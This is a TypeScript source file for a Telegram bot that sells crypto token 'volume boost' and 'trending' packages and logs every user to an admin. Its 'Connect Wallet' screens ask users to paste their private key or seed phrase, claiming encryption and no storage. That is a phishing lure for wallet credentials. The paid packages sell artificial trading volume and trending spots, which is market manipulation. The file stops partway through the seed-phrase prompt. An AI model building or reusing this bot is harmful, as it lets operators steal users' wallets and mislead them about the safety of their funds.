import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import { Telegraf } from "telegraf";
import { notifyAdmin, setBot } from "./admin.js";
import { getSession, setSession, clearSession, getAllSessions } from "./sessions.js";
import { deriveWalletForUser } from "./wallet.js";
import { fetchTokenInfo, isValidCA, detectCAChain } from "./tokenInfo.js";
import { saveOrder, updateOrder, getAllOrders } from "./orders.js";
import { detectChain, verifyTx, isHashUsed, markHashUsed } from "./txVerify.js";
import { logger } from "../lib/logger.js";
import {
  mainMenuKeyboard,
  solPickerKeyboard,
  confirmOrderKeyboard,
  paymentSentKeyboard,
  cancelKeyboard,
  volumeBoostKeyboard,
  trendingMenuKeyboard,
  solTrendingKeyboard,
  ethTrendingKeyboard,
  pumpfunTrendingKeyboard,
  dexscreenerKeyboard,
  depositKeyboard,
  connectWalletKeyboard,
  securityGuidelinesKeyboard,
  howToConnectKeyboard,
  mainMenuOnlyKeyboard,
} from "./keyboards.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);

const IMG = {
  welcome:       path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect: path.join(__dirname, "images", "walletconnect.jpeg"),
  volume:        path.join(__dirname, "images", "volume.jpeg"),
  trending:      path.join(__dirname, "images", "trending.jpeg"),
};

const SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
const ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";

// ── Bot's own public base URL (for image proxy) ───────────────────────────────
const BOT_SERVER_BASE =
  process.env["RENDER_EXTERNAL_HOSTNAME"] ? `https://${process.env["RENDER_EXTERNAL_HOSTNAME"]}` :
  process.env["REPLIT_DEV_DOMAIN"]        ? `https://${process.env["REPLIT_DEV_DOMAIN"]}` :
  null;

function proxyImgUrl(raw: string): string | null {
  if (!raw || !BOT_SERVER_BASE) return null;
  return `${BOT_SERVER_BASE}/api/img?url=${encodeURIComponent(raw)}`;
}

async function safeSendPhoto(ctx: any, url: string, opts: any): Promise<boolean> {
  // 1) try direct URL
  try { await ctx.replyWithPhoto(url, opts); return true; } catch {}
  // 2) try via our image proxy (bypasses CORS/IPFS issues)
  const proxied = proxyImgUrl(url);
  if (proxied) {
    try { await ctx.replyWithPhoto(proxied, opts); return true; } catch {}
  }
  return false;
}

// ── Real-time service-selection notification ───────────────────────────────────
async function notifyServiceSelected(ctx: any, service: string, pkg: string, amount: string) {
  const u = ctx.from;
  const name = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
  const handle = u.username ? ` (@${u.username})` : "";
  await notifyAdmin(
    `🎯 <b>Service Selected</b>\n\n` +
    `👤 ${name}${handle}\n` +
    `🆔 ID: <code>${u.id}</code>\n\n` +
    `📦 Service: <b>${service}</b>\n` +
    `💰 Package: <b>${pkg}</b>\n` +
    `💵 Amount: <b>${amount}</b>\n\n` +
    `⏰ ${new Date().toUTCString()}`
  );
}

// ── Package tables ─────────────────────────────────────────────────────────────
interface VolPkg { label: string; sol: number; volume: string; service: string }
const VOLUME_PKGS: Record<string, VolPkg> = {
  vol_iron:     { label: "Iron",     sol: 1.50,  volume: "$50,000",       service: "Iron Package"     },
  vol_bronze:   { label: "Bronze",   sol: 2.50,  volume: "$250,000",      service: "Bronze Package"   },
  vol_silver:   { label: "Silver",   sol: 5.00,  volume: "$100,000,000",  service: "Silver Package"   },
  vol_gold:     { label: "Gold",     sol: 3.50,  volume: "$100,000",      service: "Gold Package"     },
  vol_platinum: { label: "Platinum", sol: 7.50,  volume: "$500,000",      service: "Platinum Package" },
  vol_diamond:  { label: "Diamond",  sol: 10.50, volume: "$2,500,000",    service: "Diamond Package"  },
};

interface TrendPkg { label: string; sol: number; service: string }
const SOL_TREND_PKGS: Record<string, TrendPkg> = {
  st_top3_3hr:   { label: "TOP 3 — 3 hr",   sol: 1.50, service: "SOL Trending TOP3 3hr"   },
  st_top3_6hr:   { label: "TOP 3 — 6 hr",   sol: 2.30, service: "SOL Trending TOP3 6hr"   },
  st_top3_12hr:  { label: "TOP 3 — 12 hr",  sol: 3.70, service: "SOL Trending TOP3 12hr"  },
  st_top3_24hr:  { label: "TOP 3 — 24 hr",  sol: 5.90, service: "SOL Trending TOP3 24hr"  },
  st_top10_3hr:  { label: "TOP 10 — 3 hr",  sol: 1.00, service: "SOL Trending TOP10 3hr"  },
  st_top10_6hr:  { label: "TOP 10 — 6 hr",  sol: 1.60, service: "SOL Trending TOP10 6hr"  },
  st_top10_12hr: { label: "TOP 10 — 12 hr", sol: 2.60, service: "SOL Trending TOP10 12hr" },
  st_top10_24hr: { label: "TOP 10 — 24 hr", sol: 4.10, service: "SOL Trending TOP10 24hr" },
};

const ETH_TREND_PKGS: Record<string, { usd: number; service: string }> = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" },
};

const DEX_PKGS: Record<string, TrendPkg> = {
  dex_5hr:  { label: "TOP 6 — 5 hr",  sol: 2,   service: "DexScreener TOP6 5hr"  },
  dex_7hr:  { label: "TOP 6 — 7 hr",  sol: 3.5, service: "DexScreener TOP6 7hr"  },
  dex_12hr: { label: "TOP 6 — 12 hr", sol: 7,   service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 — 18 hr", sol: 10,  service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 — 24 hr", sol: 15,  service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 — 32 hr", sol: 22,  service: "DexScreener TOP6 32hr" },
};

// ── Send photo with text fallback ─────────────────────────────────────────────
async function sendPhoto(ctx: any, img: string, caption: string, extra: any = {}) {
  try {
    await ctx.replyWithPhoto({ source: img }, { caption, parse_mode: "HTML", ...extra });
  } catch {
    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
  }
}

// ── Edit existing message or send new one ─────────────────────────────────────
async function editOrSend(ctx: any, text: string, extra: any = {}) {
  try {
    await ctx.editMessageCaption(text, { parse_mode: "HTML", ...extra });
  } catch {
    try {
      await ctx.editMessageText(text, { parse_mode: "HTML", ...extra });
    } catch {
      await ctx.reply(text, { parse_mode: "HTML", ...extra });
    }
  }
}

// ── Screen builders ───────────────────────────────────────────────────────────
async function sendWelcome(ctx: any) {
  const caption =
    `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
    `New to volume bots? No worries — we made it super simple!\n\n` +
    `<b>How it works:</b>\n` +
    `1. Select bumps/volume.\n` +
    `2. Pick duration.\n` +
    `3. Done! Pump.fun Server handles the rest.\n\n` +
    `<b>Works on:</b>\n` +
    `🟢 <a href="https://pump.fun">Pumpfun</a> • 🟢 <a href="https://raydium.io">Raydium</a> •\n` +
    `🟢 <a href="https://pumpswap.xyz">PumpSwap</a> • 🟢 <a href="https://moonshot.money">Moonshot</a> •\n` +
    `🟢 <a href="https://letsbonk.fun">LetsBonk</a> • 🟢 <a href="https://dexscreener.com">Dexpad/screener</a> •\n\n` +
    `From 0.3-0.4-0.5-0.6 SOL bumps, boost trend with mass volume and high stability.\n\n` +
    `👇 <b>Choose a service:</b>`;
  await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
}

async function showStartBumping(ctx: any) {
  const text =
    `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
    `<b>Supported Platform:</b>\n` +
    `Pumpfun and Raydium.\n\n` +
    `Pumpfun BumpBot charges a one-time fee of 0.3 SOL per token, making it the cheapest bump bot ever!\n\n` +
    `📊 <b>Trending channel:</b>\n` +
    `https://t.me/pumpmints\n\n` +
    `Subscribe to our PF alert tools:\n` +
    `- PF New Raydium Pools: t.me/pumpswap_pools\n\n` +
    `For more information, please contact @mrpooh`;
  await editOrSend(ctx, text, solPickerKeyboard);
}

async function showVolumeBoost(ctx: any) {
  const caption =
    `✏️ <b>Iron Package - $50,000 Volume</b>\n` +
    `✏️ <b>Bronze Package - $250,000 Volume</b>\n` +
    `✏️ <b>Silver Package - $100,000,000 Volume</b>\n` +
    `✏️ <b>Gold Package - $100,000 Volume</b>\n` +
    `✏️ <b>Platinum Package - $500,000 Volume</b>\n` +
    `✏️ <b>Diamond Package - $2,500,000 Volume</b>\n\n` +
    `Please select the package below...`;
  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
}

async function showTrendingBoost(ctx: any) {
  const caption =
    `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
    `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
    `➡️ Please choose SOL Trending or Pump Fun Trending to start:`;
  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
}

async function showDexScreener(ctx: any) {
  const text =
    `🌐 DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.\n\n` +
    `<b>TREND ON DEX</b>`;
  await editOrSend(ctx, text, dexscreenerKeyboard);
}

async function showDeposit(ctx: any) {
  const wallet = deriveWalletForUser(ctx.from.id);
  const text =
    `<b>WALLET BALANCE</b>\n\n` +
    `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n` +
    `balance: 0 ETH\n\n` +
    `<b>SOL:</b>\n<code>${wallet.address}</code>\n` +
    `balance: 0 SOL\n\n` +
    `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
    `💰 KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.\n` +
    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`;
  await editOrSend(ctx, text, depositKeyboard);
}

async function showConnectWallet(ctx: any) {
  const caption =
    `🔗 <b>Connect Your Wallet</b>\n\n` +
    `Welcome to our secure wallet connection service!\n\n` +
    `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
    `<b>Available Options:</b>\n` +
    `🔗 Connect Now - Start the connection process\n` +
    `🔑 Why Connect? - Learn about the benefits\n` +
    `🛡️ Security Guidelines - Important safety information\n` +
    `📱 How to Connect - Step-by-step instructions\n\n` +
    `Your security is our top priority. We use industry-standard encryption to protect your information.`;
  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
}

async function showSupport(ctx: any) {
  const text =
    `💬 <b>Contact Support</b>\n\n` +
    `For assistance, contact: <b>@mrpooh</b>\n\n` +
    `📊 Trending channel: https://t.me/pumpmints\n` +
    `🔔 PF Alert Tools: t.me/pumpswap_pools\n\n` +
    `Your User ID: <code>${ctx.from.id}</code>\n` +
    `⏰ Support hours: 24/7\n\n` +
    `We typically respond within 15 minutes.`;
  await editOrSend(ctx, text, mainMenuOnlyKeyboard);
}

// ── Bot factory ───────────────────────────────────────────────────────────────
export function createBot(): Telegraf {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token);
  setBot(bot);

  // ── Global error boundary — one bad update NEVER kills polling/webhook ──────
  bot.catch((err: unknown, ctx: any) => {
    const msg = err instanceof Error ? err.message : String(err);
    logger.error({ err, updateType: ctx?.updateType }, `Bot error: ${msg}`);
    ctx?.answerCbQuery?.("⚠️ Something went wrong. Please try again.").catch(() => {});
    ctx?.reply?.("⚠️ Something went wrong. Please use /start to restart.").catch(() => {});
  });

  // ── /start ────────────────────────────────────────────────────────────────
  bot.start(async (ctx) => {
    const u = ctx.from;
    clearSession(u.id);
    await notifyAdmin(
      `🆕 <b>New User Started Bot</b>\n` +
      `👤 ${u.first_name}${u.last_name ? " " + u.last_name : ""}` +
      `${u.username ? " (@" + u.username + ")" : ""}\n` +
      `🆔 ID: <code>${u.id}</code>\n` +
      `⏰ ${new Date().toUTCString()}`
    );
    await sendWelcome(ctx);
  });

  // ── Main menu callback buttons ────────────────────────────────────────────
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });

  bot.action("menu_bump",     async (ctx) => { await ctx.answerCbQuery(); await showStartBumping(ctx); });
  bot.action("menu_volume",   async (ctx) => { await ctx.answerCbQuery(); await showVolumeBoost(ctx); });
  bot.action("menu_trending", async (ctx) => { await ctx.answerCbQuery(); await showTrendingBoost(ctx); });
  bot.action("menu_dex",      async (ctx) => { await ctx.answerCbQuery(); await showDexScreener(ctx); });
  bot.action("menu_deposit",  async (ctx) => { await ctx.answerCbQuery(); await showDeposit(ctx); });
  bot.action("menu_wallet",   async (ctx) => { await ctx.answerCbQuery(); await showConnectWallet(ctx); });
  bot.action("menu_support",  async (ctx) => { await ctx.answerCbQuery(); await showSupport(ctx); });

  // ── SOL bump amount picker ────────────────────────────────────────────────
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "Volume Bumping", `${amt} SOL per bump`, `${amt} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: parseFloat(amt),
        serviceLabel: `Volume Bumping (${amt} SOL)`,
        boostType: "bump",
      });
      await editOrSend(ctx,
        `📝 <b>Enter Contract Address</b>\n\n` +
        `Selected: <b>${amt} SOL</b> per bump\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }

  // ── Volume Boost packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(VOLUME_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "Volume Boost", `${pkg.service} — ${pkg.volume}`, `${pkg.sol} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key,
      });
      await editOrSend(ctx,
        `📝 <b>Enter Contract Address</b>\n\n` +
        `Package: <b>${pkg.label}</b>\n` +
        `Cost: <b>${pkg.sol} SOL</b>\n` +
        `Volume: <b>${pkg.volume}</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }

  // ── Trending menu ─────────────────────────────────────────────────────────
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx,
      `☀️ <b>SOL Trending</b>\n\nChoose your package — TOP 3 (left) or TOP 10 (right):`,
      solTrendingKeyboard
    );
  });

  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx,
      `🔵 <b>ETH TREND</b>\n\nKindly chose the trend you wish to pump on.`,
      ethTrendingKeyboard
    );
  });

  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    const caption =
      `🔥 <b>PUMP.FUN TRENDING</b> 🔥\n\n` +
      `💡 THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`;
    await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
  });

  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });

  bot.action("st_top3_label",  async (ctx) => ctx.answerCbQuery("TOP 3 — left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 — right column"));

  // ── SOL trending packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(SOL_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "SOL Trending Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key,
      });
      await editOrSend(ctx,
        `📝 <b>Enter Contract Address</b>\n\n` +
        `Package: <b>${pkg.label}</b>\n` +
        `Cost: <b>${pkg.sol} SOL</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }

  // ── ETH trending packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(ETH_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "ETH Trending Boost", pkg.service, `$${pkg.usd} USD`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        ethAmount: pkg.usd,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key,
      });
      await editOrSend(ctx,
        `📝 <b>Enter Contract Address</b>\n\n` +
        `Package: <b>ETH Trending $${pkg.usd}</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }

  // ── PumpFun trending ──────────────────────────────────────────────────────
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    notifyServiceSelected(ctx, "PumpFun Trending", "Trending Slot — 30 min", "3.5 SOL").catch(() => {});
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30",
    });
    await editOrSend(ctx,
      `📝 <b>Enter Contract Address</b>\n\n` +
      `Package: <b>P.F.T — 30 SOL</b>\n\n` +
      `Please paste the Contract Address (CA) of your token:`,
      cancelKeyboard
    );
  });

  // ── DexScreener info label ────────────────────────────────────────────────
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));

  // ── DexScreener packages ──────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(DEX_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "DexScreener Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key,
      });
      await editOrSend(ctx,
        `📝 <b>Enter Contract Address</b>\n\n` +
        `Package: <b>${pkg.label}</b>\n` +
        `Cost: <b>${pkg.sol} SOL</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        cancelKeyboard
      );
    });
  }

  // ── Confirm order ─────────────────────────────────────────────────────────
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet   = deriveWalletForUser(ctx.from.id);
    const orderId  = randomUUID().split("-")[0].toUpperCase();
    const isEth    = s.boostType === "eth_trending";
    const payWallet = isEth ? ETH_ADDRESS : wallet.address;

    setSession(ctx.from.id, {
      step: "awaiting_payment_sent",
      paymentWallet: payWallet,
      orderId,
    });

    // Save order to the in-memory store
    saveOrder({
      id:              orderId,
      userId:          ctx.from.id,
      userName:        `${ctx.from.first_name}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
      userHandle:      ctx.from.username ?? "",
      tokenName:       s.tokenName    ?? "Unknown",
      tokenSymbol:     s.tokenSymbol  ?? "???",
      contractAddress: s.contractAddress ?? "",
      service:         s.serviceLabel ?? "Boost",
      solAmount:       s.selectedSol  ?? 0,
      usdAmount:       s.ethAmount,
      paymentWallet:   payWallet,
      status:          "pending",
      createdAt:       new Date(),
    });

    const chainLabel = s.tokenChain === "sol" ? "◎ Solana"
                     : s.tokenChain === "eth" ? "Ξ Ethereum"
                     : s.tokenChain === "bsc" ? "⬡ BSC"
                     : s.tokenChain === "base" ? "🔵 Base"
                     : "🔗";

    const amountLine = isEth
      ? `💵 <b>$${s.ethAmount} USD</b>\n📮 ETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
      : `◎ <b>${s.selectedSol} SOL</b>\n📮 SOL Wallet:\n<code>${wallet.address}</code>`;

    const paymentMsg =
      `💰 <b>Payment Required</b>\n\n` +
      `📋 <b>Order Summary:</b>\n` +
      `• Token: ${s.tokenName} (${s.tokenSymbol})\n` +
      `• Service: ${s.serviceLabel}\n` +
      (isEth
        ? `• Amount: $${s.ethAmount} USD\n`
        : `• Amount: ${s.selectedSol} SOL\n`) +
      `• Order ID: ${orderId}\n\n` +
      `💳 <b>Payment Instructions:</b>\n` +
      (isEth
        ? `Send exactly $${s.ethAmount} USD to:\n\nETH Wallet:\n<code>${ETH_ADDRESS || SOL_ADDRESS}</code>`
        : `Send exactly ${s.selectedSol} SOL to:\n\nSolana Wallet:\n<code>${wallet.address}</code>`) +
      `\n\n⚠️ <b>Important:</b>\n` +
      (isEth
        ? `• Send the EXACT amount: $${s.ethAmount} USD\n• Use Ethereum network only\n`
        : `• Send the EXACT amount: ${s.selectedSol} SOL\n• Use Solana network only\n`) +
      `• Payment expires in 15 minutes\n` +
      `• After sending, submit your transaction hash below\n\n` +
      `⏰ Time Remaining: 15:00`;

    // Show payment screen with token image if available
    let sentWithPhoto = false;
    if (s.tokenImageUrl) {
      sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
        caption: paymentMsg,
        parse_mode: "HTML",
        ...paymentSentKeyboard,
      });
    }
    if (!sentWithPhoto) {
      await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
    }

    // Admin notification with token image
    const adminMsg =
      `📋 <b>New Order</b>\n\n` +
      `👤 ${ctx.from.first_name}${ctx.from.username ? ` (@${ctx.from.username})` : ""}\n` +
      `🆔 User: <code>${ctx.from.id}</code>\n\n` +
      `🪙 <b>${s.tokenName} (${s.tokenSymbol})</b>  ${chainLabel}\n` +
      `📍 CA: <code>${s.contractAddress}</code>\n` +
      (s.tokenPrice     ? `💵 Price: ${s.tokenPrice}\n`          : "") +
      (s.tokenMarketCap ? `📈 Market Cap: ${s.tokenMarketCap}\n` : "") +
      (s.tokenLiquidity ? `💧 Liq: ${s.tokenLiquidity}\n`        : "") +
      (s.tokenVolume24h ? `🔄 Vol 24h: ${s.tokenVolume24h}\n`    : "") +
      (s.tokenDex       ? `🏦 DEX: ${s.tokenDex}\n`             : "") +
      `\n⚙️ Service: ${s.serviceLabel}\n` +
      `💰 Cost: ${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}\n` +
      `🆔 Order: <code>${orderId}</code>\n` +
      `📮 Pay to: <code>${payWallet}</code>`;

    if (s.tokenImageUrl) {
      try {
        await notifyAdmin(adminMsg, s.tokenImageUrl);
      } catch {
        await notifyAdmin(adminMsg);
      }
    } else {
      await notifyAdmin(adminMsg);
    }
  });

  // ── Payment Sent — ask for TX hash ────────────────────────────────────────
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await editOrSend(ctx,
      `📝 <b>Submit Transaction Hash</b>\n\n` +
      `Please paste your Solana transaction hash below:\n\n` +
      `💡 <b>Where to find it:</b>\n` +
      `• Copy from your wallet app after sending\n` +
      `• Check your wallet's transaction history\n` +
      `• Look for the long string of letters and numbers\n\n` +
      `🕐 <b>Order ID:</b>\n<code>${s.orderId ?? "N/A"}</code>\n\n` +
      `🔍 We'll automatically verify your payment once you submit the hash.`,
      cancelKeyboard
    );
  });

  // ── Deposit actions ───────────────────────────────────────────────────────
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await editOrSend(ctx,
      `<b>WALLET BALANCE</b>\n\n` +
      `<b>ETH:</b>\n<code>${ETH_ADDRESS || "Not configured"}</code>\n` +
      `balance: 0 ETH\n\n` +
      `<b>SOL:</b>\n<code>${wallet.address}</code>\n` +
      `balance: 0 SOL\n\n` +
      `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
      `💰 Send SOL to your wallet address above to add funds.\n` +
      `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
      mainMenuOnlyKeyboard
    );
  });

  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await editOrSend(ctx,
      `💸 <b>Withdraw Funds</b>\n\n` +
      `Send your withdrawal address and amount:\n\n` +
      `<b>Format:</b> <code>ADDRESS AMOUNT</code>\n` +
      `<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>\n\n` +
      `⚠️ Double-check — withdrawals cannot be reversed.`,
      cancelKeyboard
    );
  });

  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0", id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }],
        }),
      });
      const data: any = await resp.json();
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch { /* keep default */ }
    await editOrSend(ctx,
      `◎ <b>SOL Balance</b>\n\n` +
      `Wallet: <code>${wallet.address}</code>\n\n` +
      `Balance: <b>${balance}</b>`,
      mainMenuOnlyKeyboard
    );
  });

  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    const orders = getAllOrders().filter(o => o.userId === ctx.from.id && o.status !== "cancelled");
    const lines = orders.length
      ? orders.map(o =>
          `• ${o.service} — ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} — ${o.status} — ${o.createdAt.toLocaleDateString()}`
        ).join("\n")
      : "No orders yet.";
    await editOrSend(ctx,
      `📋 <b>My Orders</b>\n\n${lines}`,
      mainMenuOnlyKeyboard
    );
  });

  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx,
      `📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`,
      mainMenuOnlyKeyboard
    );
  });

  // ── Connect Wallet sub-screens ────────────────────────────────────────────
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });

  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx,
      `🔐 <b>Why Connect Your Wallet?</b>\n\n` +
      `Connecting your wallet unlocks:\n\n` +
      `• ⚡ <b>Instant payments</b> — no manual transfers\n` +
      `• 📊 <b>Order tracking</b> — all boosts in one place\n` +
      `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
      `• 🎯 <b>Priority processing</b> — faster service\n` +
      `• 🔔 <b>Notifications</b> — alerts when boost goes live`,
      connectWalletKeyboard
    );
  });

  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx,
      `🛡️ <b>Security Guidelines</b>\n\n` +
      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
      `🔒 <b>What We Do:</b>\n` +
      `• End-to-End Encryption - Your data is encrypted at all times\n` +
      `• No Storage - We never store your private keys permanently\n` +
      `• Secure Processing - All operations use secure, isolated environments\n` +
      `• Regular Audits - Our security is regularly tested and verified\n\n` +
      `🚨 <b>What You Should Know:</b>\n` +
      `• Never Share - Only enter your keys in official bot interfaces\n` +
      `• Monitor Activity - Regularly check your wallet transactions\n` +
      `• Stay Updated - Keep your wallet software up to date\n` +
      `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
      `🔐 <b>Our Commitment:</b>\n` +
      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
      `Ready to proceed safely?`,
      securityGuidelinesKeyboard
    );
  });

  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx,
      `📱 <b>How to Connect Your Wallet</b>\n\n` +
      `🔧 <b>Step-by-Step Process:</b>\n\n` +
      `1️⃣ <b>Choose Connection Method</b>\n` +
      `• Private Key - Direct key import (fastest)\n` +
      `• Seed Phrase - 12/24 word recovery phrase\n\n` +
      `2️⃣ <b>Prepare Your Information</b>\n` +
      `• Open your wallet app (Phantom, Solflare, etc.)\n` +
      `• Navigate to wallet settings or security section\n` +
      `• Copy your private key or seed phrase\n\n` +
      `<b>Supported Wallets:</b>\n` +
      `• Phantom - Most popular Solana wallet\n` +
      `• Solflare - Advanced features and security\n` +
      `• Backpack - Modern interface and tools\n` +
      `• Glow - Mobile-optimized experience\n` +
      `• Other Solana Wallets - Most SPL-compatible wallets\n\n` +
      `⏰ Connection Time: Usually 2-5 minutes\n` +
      `🔒 Security: Military-grade encryption throughout\n\n` +
      `Ready to connect your wallet?`,
      howToConnectKeyboard
    );
  });

  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await editOrSend(ctx,
      `🔗 <b>Connect Your Wallet Now</b>\n\n` +
      `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
      `🔑 <b>Private Key Format:</b>\n` +
      `• Single long string (64+ characters)\n` +
      `• Example:\n` +
      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
      `🌱 <b>Seed Phrase Format:</b>\n` +
      `• 12 or 24 words separated by spaces\n` +
      `• Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
      `🔰 <b>Security Features:</b>\n` +
      `• End-to-end encryption\n` +
      `• Secure processing environment\n` +
      `• Immediate deletion after connection\n` +
      `• No permanent storage\n\n` +
      `⚡ <b>Auto-Detection:</b>\n` +
